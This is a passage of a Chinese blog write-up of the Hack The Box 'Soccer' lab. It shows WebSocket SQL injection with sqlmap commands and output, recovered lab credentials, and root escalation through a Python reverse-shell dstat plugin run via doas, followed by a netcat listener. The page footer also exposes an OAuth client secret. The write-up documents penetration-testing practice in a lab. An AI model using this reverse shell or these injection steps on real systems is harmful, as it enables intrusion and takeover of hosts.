+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@soccer:/$ <span class="hljs-built_in">cat</span> /etc/doas.conf<br><span class="hljs-built_in">cat</span> /etc/doas.conf<br><span class="hljs-built_in">cat</span>: /etc/doas.conf: No such file or directory<br>www-data@soccer:/$ doas -h<br>doas -h<br>doas: invalid option -- <span class="hljs-string">&#x27;h&#x27;</span><br>usage: doas [-nSs] [-a style] [-C config] [-u user] <span class="hljs-built_in">command</span> [args]<br>www-data@soccer:/$ find / -name doas.conf 2&gt;/dev/null<br>find / -name doas.conf 2&gt;/dev/null<br>/usr/local/etc/doas.conf<br>www-data@soccer:/$ <span class="hljs-built_in">cat</span> /usr/local/etc/doas.conf<br><span class="hljs-built_in">cat</span> /usr/local/etc/doas.conf<br>permit nopass player as root cmd /usr/bin/dstat<br></code></pre></td></tr></table></figure>
+
+<p>conf 文件给出了提示，player 用户可以在不使用密码的情况下以 root 身份运行&#x2F;usr&#x2F;bin&#x2F;dstat，那接下来的问题就是如何获取 player 用户了。</p>
+<h2 id="子域名信息"><a href="#子域名信息" class="headerlink" title="子域名信息"></a>子域名信息</h2><p>一开始觉得可能是密码写在了配置文件里，但是重复信息收集均无果，因此看了眼 WP。这里的操作还是第一次见，去查看 <code>/etc/nginx/sites-enabled</code> 。实际上也可以从 <code>netstat -lntp</code> 出发，先看看有哪些本地 TCP 端口开放</p>
+<p><img src="/pic/3b9cb9626088c227b2d1d41d3d28fafd_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现了一些开放，但是没有权限查看 PID 的端口，因此尝试进入 nginx 目录看看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@soccer:/etc/nginx$ <span class="hljs-built_in">cd</span> sites-enabled<br><span class="hljs-built_in">cd</span> sites-enabled<br>www-data@soccer:/etc/nginx/sites-enabled$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 8.0K<br>259074 drwxr-xr-x 2 root root 4.0K Dec  1  2022 .<br>259060 drwxr-xr-x 8 root root 4.0K Nov 17  2022 ..<br>256059 lrwxrwxrwx 1 root root   34 Nov 17  2022 default -&gt; /etc/nginx/sites-available/default<br>262572 lrwxrwxrwx 1 root root   41 Nov 17  2022 soc-player.htb -&gt; /etc/nginx/sites-available/soc-player.htb<br>www-data@soccer:/etc/nginx/sites-enabled$ <span class="hljs-built_in">cat</span> /etc/nginx/sites-available/soc-player.htb<br>&lt;bled$ <span class="hljs-built_in">cat</span> /etc/nginx/sites-available/soc-player.htb<br>server &#123;<br>        listen 80;<br>        listen [::]:80;<br><br>        server_name soc-player.soccer.htb;<br><br>        root /root/app/views;<br><br>        location / &#123;<br>                proxy_pass http://localhost:3000;<br>                proxy_http_version 1.1;<br>                proxy_set_header Upgrade <span class="hljs-variable">$http_upgrade</span>;<br>                proxy_set_header Connection <span class="hljs-string">&#x27;upgrade&#x27;</span>;<br>                proxy_set_header Host <span class="hljs-variable">$host</span>;<br>                proxy_cache_bypass <span class="hljs-variable">$http_upgrade</span>;<br>        &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>在这里可以获取到子域名信息，我们再次修改 hosts 文件，添加子域名和 IP 的映射，访问子域名发现，主要界面和主域名是一样的，但是增加了登录和注册的选项，尝试先注册再登录（可以顺便测一下 SQL 注入），登陆后发现只有一个搜索框，存在 SQL 注入的可能性比较高。如果输入自己的票据 id 会提示存在，随便输入会提示不存在，尝试 <code>and 1=1 </code> 和 <code>and 1=0</code>，发现语句被执行，因此可以确定存在 SQL 注入。</p>
+<p>这里还是要先看下网页源代码，重要收获隐藏在源代码中，当然如果你使用的是 burp suite 那么可以在 target 中看到 sitemap 中有个 9091 的端口。</p>
+<p><img src="/pic/f45be2a36a8d465750935cd8f176c063_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>response 中提示升级到了 websocket，回到 proxy 选项，其中存在 websocket 选项卡，可以看到我们的查询内容被写在其中</p>
+<p><img src="/pic/82d4bfbf0ae750cad90a38c54b2e8d05_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs bash">var ws = new WebSocket(<span class="hljs-string">&quot;ws://soc-player.soccer.htb:9091&quot;</span>);<br>window.onload = <span class="hljs-function"><span class="hljs-title">function</span></span> () &#123;<br><br>var btn = document.getElementById(<span class="hljs-string">&#x27;btn&#x27;</span>);<br>var input = document.getElementById(<span class="hljs-string">&#x27;id&#x27;</span>);<br><br>ws.onopen = <span class="hljs-keyword">function</span> (e) &#123;<br>    console.log(<span class="hljs-string">&#x27;connected to the server&#x27;</span>)<br>&#125;<br>input.addEventListener(<span class="hljs-string">&#x27;keypress&#x27;</span>, (e) =&gt; &#123;<br>    keyOne(e)<br>&#125;);<br><br><span class="hljs-keyword">function</span> keyOne(e) &#123;<br>    e.stopPropagation();<br>    <span class="hljs-keyword">if</span> (e.keyCode === 13) &#123;<br>        e.preventDefault();<br>        sendText();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">sendText</span></span>() &#123;<br>    var msg = input.value;<br>    <span class="hljs-keyword">if</span> (msg.length &gt; 0) &#123;<br>        ws.send(JSON.stringify(&#123;<br>            <span class="hljs-string">&quot;id&quot;</span>: msg<br>        &#125;))<br>    &#125;<br>    <span class="hljs-keyword">else</span> append(<span class="hljs-string">&quot;????????&quot;</span>)<br>&#125;<br>&#125;<br><br>ws.onmessage = <span class="hljs-keyword">function</span> (e) &#123;<br>append(e.data)<br>&#125;<br><br><span class="hljs-keyword">function</span> append(msg) &#123;<br><span class="hljs-built_in">let</span> p = document.querySelector(<span class="hljs-string">&quot;p&quot;</span>);<br>// <span class="hljs-built_in">let</span> randomColor = <span class="hljs-string">&#x27;#&#x27;</span> + Math.floor(Math.random() * 16777215).toString(16);<br>// p.style.color = randomColor;<br>p.textContent = msg<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>其中嵌入了这样的代码，我们需要借助于搜索引擎考虑如何将其转换成更方便的利用</p>
+<p>![[&#x2F;pic&#x2F;Pasted image 20230607014521.png]]</p>
+<p>可以在第一个网页中找到我们所需要的代码，修改其中的关键代码</p>
+<p><img src="/pic/67a5c492fad96115ec4f5aea1a694a0a_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="SQLMap-爆破"><a href="#SQLMap-爆破" class="headerlink" title="SQLMap 爆破"></a>SQLMap 爆破</h2><h3 id="websocket-脚本与-SQLMap-联动"><a href="#websocket-脚本与-SQLMap-联动" class="headerlink" title="websocket 脚本与 SQLMap 联动"></a>websocket 脚本与 SQLMap 联动</h3><p>本地运行此 python 文件，同时另起一个 terminal 来执行 sqlmap</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sqlmap -u <span class="hljs-string">&quot;http://localhost:8081/?id=1&quot;</span> -p <span class="hljs-string">&quot;id&quot;</span> --tables<br>        ___<br>       __H__<br> ___ ___[\&quot;]_____ ___ ___  &#123;1.7.2<span class="hljs-comment">#stable&#125;</span><br>|_ -| . [)]     | .<span class="hljs-string">&#x27;| . |</span><br><span class="hljs-string">|___|_  [(]_|_|_|__,|  _|</span><br><span class="hljs-string">      |_|V...       |_|   https://sqlmap.org</span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="hljs-built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="hljs-keyword">for</span> any misuse or damage caused by this program<br><br>[*] starting @ 12:43:22 /2023-06-06/<br><br>[12:43:22] [INFO] resuming back-end DBMS <span class="hljs-string">&#x27;mysql&#x27;</span><br>[12:43:22] [INFO] testing connection to the target URL<br>[12:43:22] [WARNING] turning off pre-connect mechanism because of incompatible server (<span class="hljs-string">&#x27;SimpleHTTP/0.6 Python/3.11.2&#x27;</span>)<br>sqlmap resumed the following injection point(s) from stored session:<br>---<br>Parameter: <span class="hljs-built_in">id</span> (GET)<br>    Type: time-based blind<br>    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<br>    Payload: <span class="hljs-built_in">id</span>=1 AND (SELECT 8273 FROM (SELECT(SLEEP(5)))cpyj)<br>---<br>[12:43:22] [INFO] the back-end DBMS is MySQL<br>back-end DBMS: MySQL &gt;= 5.0.12<br>[12:43:22] [INFO] fetching database names<br>[12:43:22] [INFO] fetching number of databases<br>[12:43:22] [WARNING] time-based comparison requires larger statistical model, please <span class="hljs-built_in">wait</span>.............................. (<span class="hljs-keyword">done</span>)<br><span class="hljs-keyword">do</span> you want sqlmap to try to optimize value(s) <span class="hljs-keyword">for</span> DBMS delay responses (option <span class="hljs-string">&#x27;--time-sec&#x27;</span>)? [Y/n]<br>[12:43:30] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions<br>5<br>[12:43:36] [INFO] retrieved:<br>[12:43:41] [INFO] adjusting time delay to 1 second due to good response <span class="hljs-built_in">times</span><br>mysql<br>[12:43:56] [INFO] retrieved: information_schema<br>[12:44:57] [INFO] retrieved: performance_schema<br>[12:45:55] [INFO] retrieved: sys<br>[12:46:05] [INFO] retrieved: soccer_db<br>[12:46:36] [INFO] fetching tables <span class="hljs-keyword">for</span> databases: <span class="hljs-string">&#x27;information_schema, mysql, performance_schema, soccer_db, sys&#x27;</span><br>[12:46:36] [INFO] fetching number of tables <span class="hljs-keyword">for</span> database <span class="hljs-string">&#x27;information_schema&#x27;</span><br>[12:46:36] [INFO] retrieved: 79<br>[12:46:41] [INFO] retrieved: ADMINISTRABLE_ROLE_AUTHORIZATIONS<br>[12:48:28] [INFO] retrieved: AP^C<br></code></pre></td></tr></table></figure>
+
+<p>这里实在太慢了，因此直接去看了 WP</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sqlmap -u <span class="hljs-string">&quot;http://localhost:8081/?id=1&quot;</span> -p <span class="hljs-string">&quot;id&quot;</span> -T accounts --columns<br>        ___<br>       __H__<br> ___ ___[\&quot;]_____ ___ ___  &#123;1.7.2<span class="hljs-comment">#stable&#125;</span><br>|_ -| . [.]     | .<span class="hljs-string">&#x27;| . |</span><br><span class="hljs-string">|___|_  [.]_|_|_|__,|  _|</span><br><span class="hljs-string">      |_|V...       |_|   https://sqlmap.org</span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="hljs-built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="hljs-keyword">for</span> any misuse or damage caused by this program<br><br>[*] starting @ 12:51:24 /2023-06-06/<br><br>[12:51:25] [INFO] resuming back-end DBMS <span class="hljs-string">&#x27;mysql&#x27;</span><br>[12:51:25] [INFO] testing connection to the target URL<br>[12:51:55] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)<br>[12:51:55] [WARNING] <span class="hljs-keyword">if</span> the problem persists please check that the provided target URL is reachable. In <span class="hljs-keyword">case</span> that it is, you can try to rerun with switch <span class="hljs-string">&#x27;--random-agent&#x27;</span> and/or proxy switches (<span class="hljs-string">&#x27;--proxy&#x27;</span>, <span class="hljs-string">&#x27;--proxy-file&#x27;</span>...)<br>[12:51:55] [WARNING] turning off pre-connect mechanism because of incompatible server (<span class="hljs-string">&#x27;SimpleHTTP/0.6 Python/3.11.2&#x27;</span>)<br>sqlmap resumed the following injection point(s) from stored session:<br>---<br>Parameter: <span class="hljs-built_in">id</span> (GET)<br>    Type: time-based blind<br>    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<br>    Payload: <span class="hljs-built_in">id</span>=1 AND (SELECT 8273 FROM (SELECT(SLEEP(5)))cpyj)<br>---<br>[12:51:55] [INFO] the back-end DBMS is MySQL<br>back-end DBMS: MySQL &gt;= 5.0.12<br>[12:51:55] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) columns<br>[12:51:55] [INFO] fetching current database<br>[12:51:55] [INFO] resumed: soccer_db<br>[12:51:55] [INFO] fetching columns <span class="hljs-keyword">for</span> table <span class="hljs-string">&#x27;accounts&#x27;</span> <span class="hljs-keyword">in</span> database <span class="hljs-string">&#x27;soccer_db&#x27;</span><br>[12:51:55] [WARNING] time-based comparison requires larger statistical model, please <span class="hljs-built_in">wait</span>.............................. (<span class="hljs-keyword">done</span>)<br><span class="hljs-keyword">do</span> you want sqlmap to try to optimize value(s) <span class="hljs-keyword">for</span> DBMS delay responses (option <span class="hljs-string">&#x27;--time-sec&#x27;</span>)? [Y/n]<br>[12:52:02] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions<br>4<br>[12:52:02] [INFO] retrieved:<br>[12:52:12] [INFO] adjusting time delay to 1 second due to good response <span class="hljs-built_in">times</span><br>email<br>[12:52:24] [INFO] retrieved: varchar(40)<br>[12:53:00] [INFO] retrieved: <span class="hljs-built_in">id</span><br>[12:53:07] [INFO] retrieved: int<br>[12:53:18] [INFO] retrieved: password<br>[12:53:47] [INFO] retrieved: va^C<br></code></pre></td></tr></table></figure>
+
+<p>再次去看了 WP，直接看来用户名和密码，回头还是得进一步记一下 sqlmap 的参数，得到了</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Username:</span> player<br><span class="hljs-symbol">Password:</span> PlayerOftheMatch2022<br></code></pre></td></tr></table></figure>
+
+<p>接下来尝试 ssh 登录，成功</p>
+<h3 id="直接使用-SQLMap-进行-websocket-类型的注入"><a href="#直接使用-SQLMap-进行-websocket-类型的注入" class="headerlink" title="直接使用 SQLMap 进行 websocket 类型的注入"></a>直接使用 SQLMap 进行 websocket 类型的注入</h3><p>实际上 SQLMap 可以直接进行 websocket 类型的注入，利用我们在 BurpSuite 中拿到的信息来进行操作，值得注意的是这里的 id 如果随便给，那么会导致 SQLMap 注入只能获取到基于时间的盲注，这也是之前速度为什么那么慢的原因</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u ws://soc-player.soccer.htb:9091 --data=<span class="hljs-string">&#x27;&#123;&quot;id&quot;:&quot;4354&quot;&#125;&#x27;</span> --batch<br></code></pre></td></tr></table></figure>
+
+<p><img src="/pic/341c5ba41865757ceada48c03c1b6fb6_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>得到的返回，确实存在注入，包括布尔型和时间盲注</p>
+<p><img src="/pic/30e78b06c05d661518dc700c83677507_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>接下来使用 <code>--current-db</code> 来获取数据库名字，后续就是经典操作，因为是复习回顾别人视频里的内容来查漏补缺，所以不再赘述特别详尽的操作</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>提权的话，前面已经有了思路，也就是 doas 文件以 root 权限运行 dstat。dstat 是一个监控系统服务的工具，类似于 top -n。借助于谷歌 dstat，有这样的收获，不过图中给的命令运行会出问题，感觉可能是 HTB 做了限制，不然接下来的每个人在搜索 s 权限文件的时候，就能直接获得 root 权限了，这里使用反弹 shell 的方法成功实现了提权。<a target="_blank" rel="noopener" href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/doas/">Doas Privilege Escalation | Exploit Notes (hdks.org)</a></p>
+<p><img src="/pic/77f91baf36876bbf458d06de1ecbb166_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>再看一下 conf 文件中的提示</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@soccer:/$ <span class="hljs-built_in">cat</span> /usr/local/etc/doas.conf<br><span class="hljs-built_in">cat</span> /usr/local/etc/doas.conf<br>permit nopass player as root cmd /usr/bin/dstat<br></code></pre></td></tr></table></figure>
+
+<p>新建 dstat_exploit.py 文件位于&#x2F;usr&#x2F;local&#x2F;share&#x2F;dstat 中。dstat 命令的插件主要在一下两个位置保存： <code>/usr/share/dstat/</code> <code>/usr/local/share/dstat/</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket,subprocess,os;  <br>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);  <br>s.connect((“&lt;your-IP&gt;”,<span class="hljs-number">2929</span>));  <br>  <br>os.dup2(s.fileno(),<span class="hljs-number">0</span>);  <br>os.dup2(s.fileno(),<span class="hljs-number">1</span>);  <br>os.dup2(s.fileno(),<span class="hljs-number">2</span>);  <br>  <br><span class="hljs-keyword">import</span> pty; pty.spawn(“/<span class="hljs-built_in">bin</span>/sh”)<br></code></pre></td></tr></table></figure>
+
+<p>执行命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">player@soccer:/usr/local/share/dstat$ doas -u root /usr/bin/dstat --exploit<br>/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated <span class="hljs-keyword">in</span> favour of importlib; see the module<span class="hljs-string">&#x27;s documentation for alternative uses</span><br><span class="hljs-string">  import imp</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ sudo nc -lvnp 1234<br>[sudo] password <span class="hljs-keyword">for</span> i3eg1nner:<br>listening on [any] 1234 ...<br>connect to [10.10.14.145] from (UNKNOWN) [10.10.11.194] 59294<br><span class="hljs-comment"># whoami</span><br><span class="hljs-built_in">whoami</span><br>root<br><span class="hljs-comment"># id</span><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br><span class="hljs-comment"># cat /root/root.txt</span><br><span class="hljs-built_in">cat</span> /root/root.txt<br><br><span class="hljs-comment"># cat /home/player/user.txt</span><br><span class="hljs-built_in">cat</span> /home/player/user.txt<br><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/knowledge-database/" class="category-chain-item">knowledge_database</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Soccer靶机</div>
+      <div>https://i3eg1nner.github.io/2023/06/3f1f96829489.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>I3eg1nner</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年6月7日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/06/9690503462f3.html" title="Stocker靶机">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Stocker靶机</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/06/7015100879bb.html" title="FourandSix2.01靶机">
+                        <span class="hidden-mobile">FourandSix2.01靶机</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"a14e9a13405642f51885","clientSecret":"5662f466deab58fdbbacd0ae3718eaf1625401dd","repo":"gitalk","owner":"I3eg1nner","admin":["I3eg1nner"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: 'df61a534678f64526d8e8298d89797fe'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
